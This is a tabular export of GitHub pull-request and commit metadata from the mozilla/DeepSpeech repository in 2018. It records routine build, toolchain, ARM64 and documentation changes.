3170,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae146d06199280758cb34acb3496c0ec5d303ad6,"Merge pull request #1342 from lissyx/r1.6-arm64

R1.6 arm64"
3171,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa5bb17799dc6bb3d3850d53bbe7406674d17921,Merge remote-tracking branch 'upstream/master' into tf-master_arm64
3172,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47f6e24214e204fe2788f831bd65946962f2241e,Switch to new TensorFlow master artifacts
3173,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1345,1345,native_client/README.md - added hints about bazel and tensorflow vers…,"…ions, and some compile options

See discussion at https://discourse.mozilla.org/t/native-client-deepspeech-utils-so-undefined-reference-to-symbol-roundf-glibc-2-2-5/27624/24.",godefv,18540039,2018-04-18T07:47:32Z,COLLABORATOR,True,8,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f1c433ab90be9c972f3bce76b7e18de674a3d5ab,"native_client/README.md - added hints about bazel and tensorflow versions, and some compile options"
3174,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1342,1342,R1.6 arm64,Fixes #1305,lissyx,1645737,2018-04-17T13:15:56Z,COLLABORATOR,True,427,34,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83827915365405cf953f5d1fb537135a5903f68b,Fix jessie to stretch naming
3175,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1342,1342,R1.6 arm64,Fixes #1305,lissyx,1645737,2018-04-17T13:15:56Z,COLLABORATOR,True,427,34,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6d07388a4718458217c058b93cc6a4d565307454,Add ARM64 define on KenLM
3176,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1342,1342,R1.6 arm64,Fixes #1305,lissyx,1645737,2018-04-17T13:15:56Z,COLLABORATOR,True,427,34,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e53683c43443d6c5335ad70e5e2801be395cebb,Add ARM64 builds
3177,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1342,1342,R1.6 arm64,Fixes #1305,lissyx,1645737,2018-04-17T13:15:56Z,COLLABORATOR,True,427,34,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a92823db296257a21cef7e6c321e30bee7823fd,Add aarch64 python wheel build
3178,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1342,1342,R1.6 arm64,Fixes #1305,lissyx,1645737,2018-04-17T13:15:56Z,COLLABORATOR,True,427,34,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f0751d27d97dbb59e077c11716d170d5c9481f4,Switch to new TensorFlow r1.6 artifacts
3179,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1340,1340,Force rebuild,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-04-16T15:56:32Z,COLLABORATOR,True,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19ede1ccdedc1cb35fd033b3aaae037d3df6f0a5,"Force rebuild

X-DeepSpeech: NOBUILD"
3180,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f77a5cdd2a32ee9c3df1a36dcbfd8feea2908b99,"Switch to GCC 7.2 from Linaro and Raspbian Stretch

Fixes #1304"
3181,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b99ddfbd29bde83123f7f270b8d3be10dacb948d,"Merge pull request #1308 from lissyx/linaro-gcc72-master

Linaro gcc72 master"
3182,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73ef11441781d9832d6311afd7e7c733ef1e1b30,Disable checkpoint saving in MonitoredTrainingSession
3183,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,31c01db541e6c9d9e8cb86fa766e643ece95c29b,"Merge pull request #1318 from mozilla/issue1317

Disable checkpoint saving in MonitoredTrainingSession (Fixes #1317)"
3184,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f30bb0e5a2d691dc1f3bb994ff1cd836ab6bd011,Update to TensorFlow r1.6 with PYTHON_BIN_PATH forced
3185,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7bc78333869c684e5aae2d35add40851b49c8a43,"Merge pull request #1334 from lissyx/r1.6-py2

Update to TensorFlow r1.6 with PYTHON_BIN_PATH forced"
3186,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,28b07e45fd9a10741f2f31b4ed2d8242dba377f2,update docs to use python3 instead of python2
3187,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,648acb0457864f35c557054cb509cc62a2fe68f7,"Merge pull request #1336 from ftyers/update-docs

Update README to use python3 only

X-DeepSpeech: NOBUILD"
3188,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,342f16e5bf11647d568faeeb7c2fd66f1d6bafd1,Update tasks names to ARMv7
3189,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,021de3c2a7e7f11a8ae143c9692cbe216ab3f162,"Enable C++, NodeJS tests on RPi3

Fixes #1303"
3190,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c84d3c5d66bcc71bf07bb3ca060762eebd2c690f,"Merge pull request #1312 from lissyx/rpi3-test

Enable C++ tests on RPi3"
3191,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,67fcee1e8b1fc7446e2a2dc4da6aa58d78a5bfbf,Merge remote-tracking branch 'upstream/master' into rpi3-master
3192,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1339,1339,Rpi3 master,,lissyx,1645737,2018-04-16T15:40:29Z,COLLABORATOR,True,731,133,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,22a59cf0d8f6451a96007d855176a92e48d51aa4,Update TensorFlow artifacts
3193,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1338,1338,Force rebuild,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-04-16T15:39:30Z,COLLABORATOR,True,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5bb6c0c87fce3e463216699f41af78564e3e06b3,"Force rebuild

X-DeepSpeech: NOBUILD"
3194,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1336,1336,Update README to use python3 only,"This is a new attempt to update the README, sorry for the ""pull noise"". Now it only has one commit, and is being merged from a branch. See #1301 (which can now be deleted) and issue #1298.",ftyers,449545,2018-04-16T07:42:08Z,COLLABORATOR,True,20,20,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,28b07e45fd9a10741f2f31b4ed2d8242dba377f2,update docs to use python3 instead of python2
3195,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1335,1335,Switch TensorFlow artifacts,,lissyx,1645737,2018-04-15T11:10:33Z,COLLABORATOR,True,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,710a729dda34e0a429432506a00600a4580e7d91,Update to TensorFlow master with PYTHON_BIN_PATH forced
3196,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1334,1334,Update to TensorFlow r1.6 with PYTHON_BIN_PATH forced,,lissyx,1645737,2018-04-15T11:08:30Z,COLLABORATOR,True,24,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f30bb0e5a2d691dc1f3bb994ff1cd836ab6bd011,Update to TensorFlow r1.6 with PYTHON_BIN_PATH forced
3197,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1333,1333,Switch TensorFlow artifacts,,lissyx,1645737,2018-04-15T09:35:18Z,COLLABORATOR,False,21,21,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2559158022f9e0d11394edc926a110065ef5d96,Switch TensorFlow artifacts
3198,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1332,1332,Rpi3 test 2,,lissyx,1645737,2018-04-14T20:36:21Z,COLLABORATOR,False,27,27,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c8d571bc796d48baef004e82db0a3192028d67a,Update tasks names to ARMv7
3199,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1332,1332,Rpi3 test 2,,lissyx,1645737,2018-04-14T20:36:21Z,COLLABORATOR,False,27,27,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b7e0f2326432ac9091b46bddcafa25ed9614d05a,Switch TensorFlow artifacts
3200,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1331,1331,Test build,,lissyx,1645737,2018-04-14T16:23:34Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fcf9535e61a33894b80ae9e11473ad9f31eb4b64,Test build
3201,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1318,1318,Disable checkpoint saving in MonitoredTrainingSession (Fixes #1317),,reuben,477142,2018-03-26T22:15:31Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73ef11441781d9832d6311afd7e7c733ef1e1b30,Disable checkpoint saving in MonitoredTrainingSession
3202,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1312,1312,Enable C++ tests on RPi3,Fixes #1303,lissyx,1645737,2018-03-20T14:46:36Z,COLLABORATOR,True,686,88,77,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,342f16e5bf11647d568faeeb7c2fd66f1d6bafd1,Update tasks names to ARMv7
3203,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1312,1312,Enable C++ tests on RPi3,Fixes #1303,lissyx,1645737,2018-03-20T14:46:36Z,COLLABORATOR,True,686,88,77,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,021de3c2a7e7f11a8ae143c9692cbe216ab3f162,"Enable C++, NodeJS tests on RPi3

Fixes #1303"
3204,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1308,1308,Linaro gcc72 master,,lissyx,1645737,2018-03-19T13:12:44Z,COLLABORATOR,True,29,29,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f77a5cdd2a32ee9c3df1a36dcbfd8feea2908b99,"Switch to GCC 7.2 from Linaro and Raspbian Stretch

Fixes #1304"
3205,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1307,1307,Linaro gcc72,,lissyx,1645737,2018-03-19T12:22:11Z,COLLABORATOR,True,92,30,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a9bfbd41f846569840a186572de3dc1ac53d97c,Switch to TensorFlow r1.6
3206,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1307,1307,Linaro gcc72,,lissyx,1645737,2018-03-19T12:22:11Z,COLLABORATOR,True,92,30,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc48ba33c65aec26b7f269d089b8939613fe8f3d,"Merge pull request #1287 from lissyx/merge-r1.6

Merge r1.6"
3207,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1307,1307,Linaro gcc72,,lissyx,1645737,2018-03-19T12:22:11Z,COLLABORATOR,True,92,30,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb1fcc054206ca23be6033db67bd0383b778b095,"Increase pip default timeout

Fixes #1289"
3208,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1307,1307,Linaro gcc72,,lissyx,1645737,2018-03-19T12:22:11Z,COLLABORATOR,True,92,30,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6c78264ee5101c7363a6e8f36b553132451b983,"Merge pull request #1291 from lissyx/pip-default-timeout

Increase pip default timeout"
3209,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1307,1307,Linaro gcc72,,lissyx,1645737,2018-03-19T12:22:11Z,COLLABORATOR,True,92,30,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c4d4f1e68a2a9d9f3119bd0402d6f9a151fc87f,"Expose versions numbers on stderr

Fixes #1292"
3210,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1307,1307,Linaro gcc72,,lissyx,1645737,2018-03-19T12:22:11Z,COLLABORATOR,True,92,30,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d68fde8d7af91cd0a2519f283fe559576e0f43da,"Merge pull request #1294 from lissyx/show-versions

Expose versions numbers on stderr"
3211,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1307,1307,Linaro gcc72,,lissyx,1645737,2018-03-19T12:22:11Z,COLLABORATOR,True,92,30,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,326532a131a7318dde97ae12cc5e5cc3daa096c7,Merge remote-tracking branch 'upstream/master' into linaro-gcc72
3212,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1307,1307,Linaro gcc72,,lissyx,1645737,2018-03-19T12:22:11Z,COLLABORATOR,True,92,30,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,befa59b41d9d1ece857cd288512801b29d4a190f,Update TensorFlow master version
3213,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1307,1307,Linaro gcc72,,lissyx,1645737,2018-03-19T12:22:11Z,COLLABORATOR,True,92,30,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41b2da0bc370969a1c7db4726b1b05a629edf340,"Switch to GCC 7.2 from Linaro and Raspbian Stretch

Fixes #1304"
3214,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1302,1302,Change Python version requirements,Closes https://github.com/mozilla/DeepSpeech/issues/1298,seanfcarroll,11340230,2018-03-17T20:58:45Z,NONE,False,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c8c0cc16dc869421bd7fd8869f00731cda8957cc,change Python version requirements
3215,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1301,1301,Update README to use python3 only,Related to issue #1298.,ftyers,449545,2018-03-17T10:09:58Z,COLLABORATOR,False,20,20,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05ed5f5a3adea02186e0bf8fbd203a11c39e0b90,Update readme to only mention python3
3216,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1301,1301,Update README to use python3 only,Related to issue #1298.,ftyers,449545,2018-03-17T10:09:58Z,COLLABORATOR,False,20,20,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f154dfaf2ed7cd2bb36d04e27f57afc4b1cbb872,Update README.md
3217,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1301,1301,Update README to use python3 only,Related to issue #1298.,ftyers,449545,2018-03-17T10:09:58Z,COLLABORATOR,False,20,20,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e6f461c8a5e12a209a32a26d5ca9d685e65c971,Update README.md
3218,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1301,1301,Update README to use python3 only,Related to issue #1298.,ftyers,449545,2018-03-17T10:09:58Z,COLLABORATOR,False,20,20,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fb36ee766fd2d569827d3f703e5b5f836151618c,Update README.md
3219,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1301,1301,Update README to use python3 only,Related to issue #1298.,ftyers,449545,2018-03-17T10:09:58Z,COLLABORATOR,False,20,20,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc632deb0c20ba5498c0a3e9856bce2dfd731cc4,Python 3.5 -> Python 3.6
3220,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1301,1301,Update README to use python3 only,Related to issue #1298.,ftyers,449545,2018-03-17T10:09:58Z,COLLABORATOR,False,20,20,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5848c4b36b37e431d0e1223d1afafe024bf6fd03,Merge branch 'master' of git://github.com/Mozilla/DeepSpeech
3221,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1301,1301,Update README to use python3 only,Related to issue #1298.,ftyers,449545,2018-03-17T10:09:58Z,COLLABORATOR,False,20,20,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,77fb6be261c407c978d9de6266d2fa49e51e100c,squash commits
3222,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1301,1301,Update README to use python3 only,Related to issue #1298.,ftyers,449545,2018-03-17T10:09:58Z,COLLABORATOR,False,20,20,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,52200b76224bbdcba8c0d53a6bac9d17b1bd8a92,Merge branch 'master' of github.com:ftyers/DeepSpeech
3223,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1294,1294,Expose versions numbers on stderr,Fixes #1292,lissyx,1645737,2018-03-15T13:05:10Z,COLLABORATOR,True,82,22,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c4d4f1e68a2a9d9f3119bd0402d6f9a151fc87f,"Expose versions numbers on stderr

Fixes #1292"
3224,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1291,1291,Increase pip default timeout,Fixes #1289,lissyx,1645737,2018-03-15T08:40:40Z,COLLABORATOR,True,2,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb1fcc054206ca23be6033db67bd0383b778b095,"Increase pip default timeout

Fixes #1289"
3225,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1287,1287,Merge r1.6,,lissyx,1645737,2018-03-12T17:21:58Z,COLLABORATOR,True,24,24,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a9bfbd41f846569840a186572de3dc1ac53d97c,Switch to TensorFlow r1.6
3226,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1286,1286,Switch to new TensorFlow master artifacts,,lissyx,1645737,2018-03-12T15:39:08Z,COLLABORATOR,True,21,21,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ecdf6520358a5cc8cfeca3fb3689614159fc9f0f,Switch to new TensorFlow master artifacts
3227,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1285,1285,Update tf master,,lissyx,1645737,2018-03-12T14:10:37Z,COLLABORATOR,True,3,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4309cd5b6e31267c76565b94cc268d1b9c6a4f25,Update native client README to fix native model target name
3228,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1285,1285,Update tf master,,lissyx,1645737,2018-03-12T14:10:37Z,COLLABORATOR,True,3,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61222233e8925cc18f8b6710d763b0e239e7bb95,"Fixed missing ""requests"" package

When attempting to do local model training I noticed I had to manually install the ""requests"" package.  This should address that issue."
3229,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1285,1285,Update tf master,,lissyx,1645737,2018-03-12T14:10:37Z,COLLABORATOR,True,3,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a88a2c2cf0cae164f4163a0f9f581ad73dc2af02,"Merge pull request #1284 from blewa/patch-1

Fixed missing ""requests"" package

X-DeepSpeech: NOBUILD"
3230,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1285,1285,Update tf master,,lissyx,1645737,2018-03-12T14:10:37Z,COLLABORATOR,True,3,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8daf3a3eae0eadf08c65c01aab81187ba60ad060,Merge remote-tracking branch 'upstream/master' into update-tf-master
3231,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1284,1284,"Fixed missing ""requests"" package","When attempting to do local model training I noticed I had to manually install the ""requests"" package.  This should address that issue.",blewa,658174,2018-03-09T04:57:38Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61222233e8925cc18f8b6710d763b0e239e7bb95,"Fixed missing ""requests"" package

When attempting to do local model training I noticed I had to manually install the ""requests"" package.  This should address that issue."
3232,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1281,1281,Update ccpp,,lissyx,1645737,2018-03-01T17:46:56Z,COLLABORATOR,True,178,121,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,164f67c972032d3f95272756cd0074f090dc96af,"Add Python2.7 ucs2+ucs4 variants

Fixes #1276"
3233,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1281,1281,Update ccpp,,lissyx,1645737,2018-03-01T17:46:56Z,COLLABORATOR,True,178,121,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ebeb40292dd96c1fc129931b240f70009bca2de4,"Merge pull request #1279 from lissyx/py27-unicode

Add Python2.7 ucs2+ucs4 variants"
3234,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1281,1281,Update ccpp,,lissyx,1645737,2018-03-01T17:46:56Z,COLLABORATOR,True,178,121,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5a9453c94f9fc9a48883a6dde34c1b47659dbff,Merge remote-tracking branch 'upstream/master' into update-ccpp
3235,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1280,1280,Update tf master,,lissyx,1645737,2018-03-01T17:44:08Z,COLLABORATOR,True,178,122,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,164f67c972032d3f95272756cd0074f090dc96af,"Add Python2.7 ucs2+ucs4 variants

Fixes #1276"
3236,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1280,1280,Update tf master,,lissyx,1645737,2018-03-01T17:44:08Z,COLLABORATOR,True,178,122,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ebeb40292dd96c1fc129931b240f70009bca2de4,"Merge pull request #1279 from lissyx/py27-unicode

Add Python2.7 ucs2+ucs4 variants"
3237,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1280,1280,Update tf master,,lissyx,1645737,2018-03-01T17:44:08Z,COLLABORATOR,True,178,122,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4d343bb81ed13c1c1941965385251cc98386f7d,Merge remote-tracking branch 'upstream/master' into update-tf-master
3238,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1279,1279,Add Python2.7 ucs2+ucs4 variants,Fixes #1276,lissyx,1645737,2018-03-01T10:59:58Z,COLLABORATOR,True,178,122,71,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,164f67c972032d3f95272756cd0074f090dc96af,"Add Python2.7 ucs2+ucs4 variants

Fixes #1276"
